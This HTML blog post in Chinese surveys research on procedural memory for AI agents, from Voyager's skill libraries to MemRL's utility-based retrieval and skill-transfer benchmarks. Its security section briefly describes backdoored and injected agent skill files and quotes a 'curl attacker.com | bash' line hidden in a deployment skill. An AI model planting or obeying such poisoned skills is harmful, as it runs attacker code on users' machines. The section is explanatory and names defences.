@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Agent 的第三种记忆：程序性记忆如何让 AI 从经验中"学会做事" - Robert's Blog</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; line-height: 1.8; color: #333; background: #f5f5f5; padding: 20px; }
+        .container { max-width: 800px; margin: 0 auto; background: white; padding: 40px 50px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
+        h1 { font-size: 2.2em; margin-bottom: 15px; color: #2c3e50; line-height: 1.3; }
+        .meta { color: #666; font-size: 0.9em; margin-bottom: 30px; padding-bottom: 20px; border-bottom: 1px solid #eee; }
+        h2 { font-size: 1.6em; margin-top: 40px; margin-bottom: 20px; color: #2c3e50; border-left: 4px solid #3498db; padding-left: 15px; }
+        h3 { font-size: 1.3em; margin-top: 30px; margin-bottom: 15px; color: #34495e; }
+        p { margin-bottom: 15px; text-align: justify; }
+        ul, ol { margin-left: 25px; margin-bottom: 15px; }
+        li { margin-bottom: 8px; }
+        code { background: #f8f9fa; padding: 2px 6px; border-radius: 3px; font-family: "Monaco", "Consolas", monospace; font-size: 0.9em; color: #e74c3c; }
+        pre { background: #2c3e50; color: #ecf0f1; padding: 20px; border-radius: 6px; overflow-x: auto; margin-bottom: 20px; font-size: 0.9em; line-height: 1.6; }
+        pre code { background: none; color: inherit; padding: 0; }
+        blockquote { border-left: 4px solid #3498db; padding: 15px 20px; margin: 20px 0; color: #555; font-style: italic; background: #f9f9f9; border-radius: 4px; }
+        strong { color: #2c3e50; font-weight: 600; }
+        .highlight { background: #fff3cd; padding: 15px; border-radius: 4px; border-left: 4px solid #ffc107; margin: 20px 0; }
+        .success { background: #d4edda; border-left-color: #28a745; }
+        table { width: 100%; border-collapse: collapse; margin: 20px 0; }
+        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
+        th { background: #f8f9fa; font-weight: 600; }
+        a { color: #3498db; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+        .back-link { display: inline-block; margin-bottom: 20px; color: #3498db; font-size: 0.95em; }
+        .tag { display: inline-block; background: #e8f4f8; color: #2980b9; padding: 2px 10px; border-radius: 12px; font-size: 0.8em; margin-right: 8px; }
+        hr { border: none; border-top: 1px solid #eee; margin: 30px 0; }
+        .toc { background: #f8f9fa; padding: 20px 25px; border-radius: 6px; margin-bottom: 30px; }
+        .toc-title { font-weight: 600; margin-bottom: 10px; color: #2c3e50; }
+        .toc ul { list-style: none; margin-left: 0; }
+        .toc a { color: #3498db; font-size: 0.95em; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="../index.html" class="back-link">← 返回首页</a>
+
+        <h1>Agent 的第三种记忆：程序性记忆如何让 AI 从经验中"学会做事"</h1>
+        <div class="meta">
+            2026-08-07 · 罗嵩 ·
+            <span class="tag">Procedural Memory</span>
+            <span class="tag">Agent Skills</span>
+            <span class="tag">Self-Evolving</span>
+            <span class="tag">深度调研</span>
+        </div>
+
+        <blockquote>基于 15+ 篇论文的系统性调研，梳理 Agent 程序性记忆从 Voyager 的代码技能库到 MemRL 的效用值检索的完整演进脉络。这是一个正在从"手工配置文件"走向"自动进化系统"的前沿领域。</blockquote>
+
+        <h2>引言：一个 Agent 重复犯了 10 次同样的错误</h2>
+
+        <p>想象一个场景：你的 AI Agent 第一次帮你部署一个前端项目，它花了 15 步才成功——中间踩了 npm 需要用 pnpm 替代、端口被占用要用 lsof 查、环境变量要从 .env.local 读取这三个坑。你期望第二次部署时它会快很多。</p>
+
+        <p>但现实是：它又花了 14 步。因为 <strong>它不记得"怎么做"</strong>。</p>
+
+        <p>这不是个 bug，而是当前绝大多数 Agent 的根本性缺陷——它们有事实记忆（知道你的项目叫什么）、有对话记忆（记得你上周说了什么），但缺乏<strong>程序性记忆</strong>（procedural memory）：那种"做过一次就能总结出套路，下次直接复用"的能力。</p>
+
+        <p>这是人类最本能的学习方式。你第一次组装宜家桌子可能要两小时，第二次四十分钟，第三次十五分钟。不是因为你的大脑变聪明了，而是因为你的<strong>程序性记忆</strong>把成功步骤蒸馏成了可复用的技能。</p>
+
+        <p>2023 年到 2026 年，从 Voyager 在 Minecraft 中学会第一个技能，到 MemRL 用强化学习给记忆打效用值，Agent 程序性记忆正在经历从"手工编写"到"自动进化"的范式转变。这篇文章基于 15+ 篇论文的调研，试图回答：Agent 怎么才能像人一样，从做中学？</p>
+
+        <hr>
+
+        <div class="toc">
+            <div class="toc-title">📋 目录</div>
+            <ul>
+                <li>一、三种记忆：认知科学给出的蓝图</li>
+                <li>二、进化史：从 Minecraft 到自我进化</li>
+                <li>三、核心技术问题：构建、检索、更新</li>
+                <li>四、效用值检索：语义相似度的终结</li>
+                <li>五、技能迁移的过专业化陷阱</li>
+                <li>六、安全：被忽视的第三维度</li>
+                <li>七、实践建议：今天能做什么</li>
+            </ul>
+        </div>
+
+        <h2>一、三种记忆：认知科学给出的蓝图</h2>
+
+        <p>要理解程序性记忆，先要把它放到 Agent 记忆的完整版图中。2025-2026 年，整个行业收敛到了一个三层分类法——这个分类法直接来自认知科学，不是厂商发明的：</p>
+
+        <table>
+            <tr><th>记忆类型</th><th>存储内容</th><th>Agent 对应</th><th>人类类比</th></tr>
+            <tr><td><strong>情景记忆</strong> (Episodic)</td><td>具体事件、对话历史</td><td>"上周用户问了我 X"</td><td>你的日记本</td></tr>
+            <tr><td><strong>语义记忆</strong> (Semantic)</td><td>事实、知识、偏好</td><td>"用户偏好深色主题"</td><td>你的百科全书</td></tr>
+            <tr><td><strong>程序性记忆</strong> (Procedural)</td><td>怎么做事情</td><td>"部署前要跑 pnpm build"</td><td>你会骑自行车</td></tr>
+        </table>
+
+        <p>前两种记忆的工具化已经相对成熟。Mem0、Letta、Zep 都能很好地管理用户的对话历史和事实偏好。但第三种——程序性记忆——被 Mem0 在 2026 年初的报告中明确标注为 <strong>"still early-stage"</strong>。</p>
+
+        <p>这意味着什么？意味着目前最好的程序性记忆实践是<strong>人工编写</strong>的配置文件：Claude Code 的 <code>CLAUDE.md</code>、Codex 的 <code>AGENTS.md</code>、Cursor 的 <code>.cursorrules</code>。这些文件本质上就是人类手写的程序性记忆——编码规范、部署步骤、架构约定。</p>
+
+        <p>但人类手写有三个问题：写得累、更新慢、不能迁移。这就是自动化程序性记忆要解决的。</p>
+
+        <h2>二、进化史：从 Minecraft 到自我进化</h2>
+
+        <p>程序性记忆的研究不是凭空出现的。它有一条清晰的进化线：</p>
+
+        <h3>第一代：代码技能库（2023）</h3>
+
+        <p><strong>Voyager</strong>（NeurIPS 2023）是第一个里程碑。在 Minecraft 里，Voyager 把成功的操作序列存成 JavaScript 代码片段——"砍树"、"做工作台"、"冶炼铁锭"——形成一个不断增长的技能库。下次遇到新任务，它会先查技能库，找到相关技能直接调用，而不是从零开始摸索。</p>
+
+        <p>结果惊人：获取物品速度是之前的 3.3 倍，解锁科技树速度快 15.3 倍。更关键的是，把技能库迁移到全新的 Minecraft 世界，Voyager 依然能快速完成从未见过的任务——技能是可迁移的。</p>
+
+        <p>Voyager 证明了一件事：<strong>把成功行为外化为可复用的代码单元，比让模型每次从头推理有效得多</strong>。</p>
+
+        <h3>第二代：洞察提取（2024）</h3>
+
+        <p><strong>ExpeL</strong>（AAAI 2024）把程序性记忆从"代码片段"升级到了"自然语言洞察"。它的核心是：不仅记住成功的轨迹，还要从成功和失败的对比中提取<strong>高层规则</strong>。</p>
+
+        <p>ExpeL 的洞察提取机制很优雅：给 LLM 一组成功和失败的案例对，让它用 ADD（添加新洞察）、UPVOTE（支持）、DOWNVOTE（反对）、EDIT（修改）四个操作来维护一个洞察列表。这本质上是让 Agent 自己做"复盘"。</p>
+
+        <p>同年，<strong>Agent Workflow Memory (AWM)</strong>（ICML 2025）在 Web 导航任务上证明：Agent 可以自动归纳出"工作流"——一组按顺序排列的操作模式——并在新任务中复用。比如"在电商网站找商品并下单"这个工作流，一旦学会，可以迁移到不同的电商网站。</p>
+
+        <h3>第三代：系统化框架（2025）</h3>
+
+        <p><strong>Mem^p</strong>（2025）是第一个把程序性记忆当作一等公民来系统研究的框架。它回答了三个基本问题：</p>
+        <ul>
+            <li><strong>怎么构建</strong>：用完整轨迹还是蒸馏后的指导原则？</li>
+            <li><strong>怎么检索</strong>：用 query 向量匹配还是关键词向量匹配？</li>
+            <li><strong>怎么更新</strong>：新增、修改、删除的策略是什么？</li>
+        </ul>
+
+        <p>在 ALFWorld（家务自动化）和 TravelPlanner（信息检索）上的实验证明：有程序性记忆的 Agent，任务成功率显著提升，而且大幅减少了步骤和 token 消耗——它不用在"不熟悉的任务上做无谓的探索"。</p>
+
+        <h3>第四代：强化学习驱动的自进化（2026）</h3>
+
+        <p><strong>MemRL</strong>（2026 年 1 月）是范式性的突破。它做了一件非常聪明的事：把记忆检索从"语义匹配"变成了"强化学习决策"。</p>
+
+        <p>传统方法检索记忆的逻辑是："当前任务和哪些过去的记忆最像？"但 MemRL 问了一个更好的问题：<strong>"过去哪些记忆真正帮助我成功了？"</strong></p>
+
+        <p>为此，它给每条记忆维护一个 Q-value（效用值），通过环境反馈不断更新。检索时分两步：先用语义相似度过滤候选集，再用效用值排序选最优。LLM 权重始终冻结——所有"学习"都发生在外部记忆系统里。</p>
+
+        <p>结果硬核：在 ALFWorld 探索任务上，MemRL 比上一代 Mem^p 提升了 56%，比无记忆 baseline 提升了 82%。</p>
+
+        <div class="highlight">
+            <strong>四年时间线：</strong> Voyager（2023）→ ExpeL（2024）→ AWM（2025）→ MemRL（2026）。从手工代码库到自动 RL 进化，每年一个跨越。
+        </div>
+
+        <h2>三、核心技术问题：构建、检索、更新</h2>
+
+        <p>抛开具体系统，程序性记忆要解决三个工程问题。我们逐一拆解。</p>
+
+        <h3>构建（Build）：从经验到技能</h3>
+
+        <p>构建的核心矛盾是<strong>粒度</strong>。太细了——记住每一步操作，信息爆炸且无法泛化。太粗了——"总结成一句话"，丢失了执行细节。</p>
+
+        <p>Salesforce 的 PMD（Procedural Memory Distillation）框架给出了一个三层结构，我觉得是目前最清晰的设计：</p>
+        <ol>
+            <li><strong>Experience Memory</strong>：原始轨迹，忠实但冗长。类似人类的"我做过这件事"的具体记忆。</li>
+            <li><strong>Insight Memory</strong>：从多次尝试同一问题中提取的策略和教训。"什么导致了成功"和"什么反复导致失败"。</li>
+            <li><strong>Behavior Memory</strong>：跨问题聚类后蒸馏出的通用行为模式。这是最高层的抽象——"遇到这类问题，应该这样做"。</li>
+        </ol>
+
+        <p>这个层次结构很优美，和认知科学中人类技能习得的过程高度一致：先做（experience），再理解（insight），最后内化（behavior）。</p>
+
+        <h3>检索（Retrieve）：相似性 vs 效用性</h3>
+
+        <p>检索是程序性记忆最深的水。</p>
+
+        <p>最朴素的方法是语义相似度检索——把当前任务的描述和记忆库里的条目做 embedding 匹配。这管用，但有一个致命问题：<strong>看起来像不等于有用</strong>。</p>
+
+        <p>举个例子：你之前成功用 React 写了一个登录页面，存了技能"如何写 React 登录表单"。现在你要用 Vue 写一个注册页面。语义上它们很相似（都是前端表单），但具体做法差异巨大。语义检索会错误地把 React 的技能推荐给你。</p>
+
+        <p>MemRL 的解决方案是在语义检索之上叠加效用值排序。每条记忆有一个 Q-value，表示"过去使用这条记忆时，任务成功的概率"。检索时先语义过滤，再按 Q-value 排序。这个两阶段漏斗既保证了相关性，又保证了有用性。</p>
+
+        <h3>更新（Update）：技能也需要新陈代谢</h3>
+
+        <p>更新是最被低估的问题。当前大多数系统只做"新增"，不做"修改"和"删除"。但技能是会过时的——API 变了、工具升级了、最佳实践变了。</p>
+
+        <p>2026 年出现了几个专门解决更新的工作：</p>
+        <ul>
+            <li><strong>EvoSkill</strong>：generate-verify-refine 循环。成功模式被强化，失败模式被修正。</li>
+            <li><strong>SkillMentor</strong>：通过"盲点诊断"识别 Agent 反复犯的同类错误，生成纠正性技能。</li>
+            <li><strong>Memento-Skills</strong>：持续技能写作 + 行为对齐路由，确保技能和实际行为一致。</li>
+        </ul>
+
+        <p>AFTER benchmark（2026）的实验数据很有说服力：单轮技能进化就能带来 <strong>+5.2 个百分点</strong>的额外提升。进化闭环比初始构建更重要。</p>
+
+        <h2>四、效用值检索：语义相似度的终结</h2>
+
+        <p>MemRL 的两阶段检索值得单独展开，因为它可能是程序性记忆领域最重要的架构创新之一。</p>
+
+        <p>传统 RAG 的底层假设是：<strong>语义相似度 ≈ 相关性 ≈ 有用性</strong>。这在文档检索场景下大致成立——一篇关于"Transformer 架构"的文档对理解 Transformer 确实有帮助。</p>
+
+        <p>但在程序性记忆场景下，这个假设崩了。因为"相似的操作"可能产生截然不同的结果。用 pnpm 而不是 npm 安装依赖——语义上几乎相同，但一个成功一个失败。</p>
+
+        <p>MemRL 的洞察来自一个类比：人类的回忆不是按"相似度"检索的。你做菜时不会回忆起所有做过类似菜的经历，而是回忆起那些<strong>帮你成功做出好吃的菜</strong>的经历。人类大脑自动给成功经验更高权重。</p>
+
+        <pre><code># MemRL 的两阶段检索（伪代码）
+
+# Stage 1: 语义过滤
+candidates = memory.filter(
+    lambda m: cosine_similarity(m.embedding, query.embedding) > threshold
+)
+
+# Stage 2: 效用值排序
+selected = sorted(candidates, key=lambda m: m.q_value, reverse=True)[:top_k]
+
+# Stage 3: 环境反馈更新 Q-value
+success = execute_task(query, selected)
+for m in selected:
+    m.q_value += learning_rate * (reward(success) - m.q_value)</code></pre>
+
+        <p>这个设计的美妙之处在于：它把 RL 的 credit assignment 问题从"模型参数"转移到了"记忆条目"。每条记忆独立维护自己的效用值，成功时被强化的记忆会在未来被优先检索，失败时被弱化的记忆会自然沉底。</p>
+
+        <p>而且这一切都不需要修改 LLM 的权重。LLM 提供稳定的推理能力，外部记忆提供可塑性——这就是 MemRL 论文所说的"decoupling stable reasoning from plastic memory"。</p>
+
+        <h2>五、技能迁移的过专业化陷阱</h2>
+
+        <p>程序性记忆最实际的工程问题是：<strong>技能能迁移吗？</strong></p>
+
+        <p>AFTER benchmark（2026）是第一个系统回答这个问题的基准测试。它包含 382 个真实工作任务，覆盖 6 种职业角色和 22 种程序性技能，专门评估技能在三个维度上的迁移效果：</p>
+
+        <table>
+            <tr><th>迁移维度</th><th>效果</th><th>结论</th></tr>
+            <tr><td>跨任务（同角色、同模型）</td><td>+2.8 pp</td><td>✅ 良好</td></tr>
+            <tr><td>跨模型（同任务、同角色）</td><td>73.1% 准确率</td><td>✅ 多模型训练后良好</td></tr>
+            <tr><td>跨角色（同任务、同模型）</td><td>显著下降</td><td>❌ 过专业化</td></tr>
+        </table>
+
+        <p>跨角色迁移失败是最有意思的发现。比如，同样是"数据分析"技能，数据分析师的工作流和产品经理的数据分析工作流可能完全不同——不同的工具偏好、不同的输出格式、不同的关注重点。技能<strong>嵌入了对特定工作流上下文的依赖</strong>，离开这个上下文就失效了。</p>
+
+        <p>这给工程实践一个重要启示：<strong>程序性记忆需要"作用域"（scope）概念</strong>。一个技能属于"前端开发"作用域、另一个属于"数据分析"作用域。检索时先匹配作用域，再在作用域内匹配具体技能。</p>
+
+        <div class="highlight success">
+            <strong>好消息：</strong>多模型轨迹训练显著提升迁移性。用 GPT-4o + Claude + Qwen 的混合轨迹训练出的技能，比只用单一模型训练的技能，跨模型迁移准确率高出至少 13.7 个百分点。这意味着<strong>多样化的经验来源是技能泛化的关键</strong>。
+        </div>
+
+        <h2>六、安全：被忽视的第三维度</h2>
+
+        <p>当程序性记忆变成自动进化系统时，安全问题就不再是可选项。</p>
+
+        <p>2026 年的安全研究揭示了三类威胁：</p>
+
+        <ul>
+            <li><strong>BadSkill（后门攻击）</strong>：在技能文件中植入后门代码，Agent 执行时触发恶意行为。比如一个"部署技能"里藏了一条 <code>curl attacker.com | bash</code>。</li>
+            <li><strong>SkillJect（闭环注入）</strong>：通过 trace-driven 闭环精炼，把恶意技能伪装成正常技能注入给 Coding Agent。</li>
+            <li><strong>Skill-Inject（文件攻击）</strong>：直接篡改 <code>SKILL.md</code> 文件，测量 Agent 对这类攻击的脆弱性。</li>
+        </ul>
+
+        <p>这些威胁的本质是：程序性记忆是<strong>可执行的</strong>——它不只是文本，而是指导 Agent 行为的指令。当记忆可以被自动生成和更新时，攻击面就从"模型权重"扩展到了"记忆系统"。</p>
+
+        <p>目前还没有成熟的防御方案，但方向是清晰的：技能签名、来源验证、执行沙箱、变更审计——这些在传统软件工程中成熟的实践，需要被移植到 Agent 记忆系统。</p>
+
+        <h2>七、实践建议：今天能做什么</h2>
+
+        <p>调研了这么多前沿研究，最实际的问题是：作为一个正在构建 Agent 系统的开发者，今天能做什么？</p>
+
+        <h3>1. 从手工技能文件开始</h3>
+        <p>不要等自动化。今天就在你的项目中创建 <code>AGENTS.md</code> 或 <code>SKILL.md</code>，记录团队的部署流程、代码规范、常见坑。这是投入产出比最高的程序性记忆。</p>
+
+        <h3>2. 为记忆系统添加效用值追踪</h3>
+        <p>在你的记忆/知识库中，为每条记录添加一个 <code>utility_score</code> 字段。任务成功后，更新相关记忆的得分。检索时用 <code>ORDER BY utility_score DESC</code> 替代纯相似度排序。这是实现 MemRL 思路的最小工程量方案。</p>
+
+        <h3>3. 构建失败反馈闭环</h3>
+        <p>当 Agent 任务失败时，不要只记录失败事实，要分析失败模式并更新相关技能。EvoSkill 的 generate-verify-refine 模式可以简化为：失败 → 分析原因 → 修改技能 → 标记为"待验证"。</p>
+
+        <h3>4. 用多模型训练技能</h3>
+        <p>如果你的技能是从执行轨迹中蒸馏出来的，尽量用多个不同模型产生的轨迹。AFTER 的数据证明，多模型训练的技能跨模型迁移准确率至少高出 13.7 个百分点。</p>
+
+        <h3>5. 给技能加作用域标签</h3>
+        <p>每个技能标注它适用的角色、任务类型、技术栈。检索时先匹配作用域，避免跨领域的错误迁移。</p>
+
+        <hr>
+
+        <h2>结语：从"能记住"到"会学习"</h2>
+
+        <p>程序性记忆的研究正在重演机器学习的历史：从手工规则到自动学习，从静态知识到动态进化，从单一模型到多模型协同。</p>
+
+        <p>MemRL 的 Q-value 检索、AFTER 的迁移评估、SkillRL 的层级进化——这些工作共同指向一个未来：Agent 不只是"能记住"发生了什么，而是真正"会学习"怎么做事情。</p>
+
+        <p>当然，这个领域还有大量未解问题。技能过专业化的根本原因是什么？非参数学习算"真正的学习"吗（SKILL0/SDAR 团队说不算，应该 internalize 到权重里）？自动生成的技能怎么保证安全？</p>
+
+        <p>但方向已经清晰。在 ICLR 2026 上，程序性记忆有了自己的专门 workshop；在工业界，Mem0 和 Letta 正在把研究成果产品化。如果你在做 Agent 系统，程序性记忆是 2026 年最值得投入的方向——没有之一。</p>
+
+        <blockquote>
+            <strong>一句话总结：</strong> Agent 的程序性记忆正在从"手工编写的配置文件"走向"自动进化的能力系统"。在这个过程中，效用值检索取代语义相似度、进化闭环取代静态存储、多模型训练取代单一来源——每一次转变都在让 Agent 更接近"从经验中学习"这个终极目标。
+        </blockquote>
+
+        <hr>
+
+        <p><strong>参考论文：</strong></p>
+        <ul style="font-size: 0.85em; color: #666;">
+            <li>Voyager (Wang et al., NeurIPS 2023) — 第一个代码技能库</li>
+            <li>Reflexion (Shinn et al., NeurIPS 2023) — 语言反馈强化学习</li>
+            <li>ExpeL (Zhao et al., AAAI 2024) — 经验池 + 洞察提取</li>
+            <li>Agent Workflow Memory (Wang et al., ICML 2025) — 工作流归纳</li>
+            <li>Mem^p (Fang et al., 2025) — 程序性记忆系统化研究</li>
+            <li>Mem0 (Chhikara et al., ECAI 2025) — 生产级三层记忆</li>
+            <li>MemRL (Zhang et al., Jan 2026) — RL 驱动的记忆效用值</li>
+            <li>AFTER Benchmark (2026) — 程序性技能迁移评估</li>
+            <li>Salesforce PMD (2026) — 三层程序性记忆蒸馏</li>
+            <li>SkillRL / SkillMentor / EvoSkill (2026) — 技能进化闭环</li>
+        </ul>
+
+    </div>
+</body>
+</html>
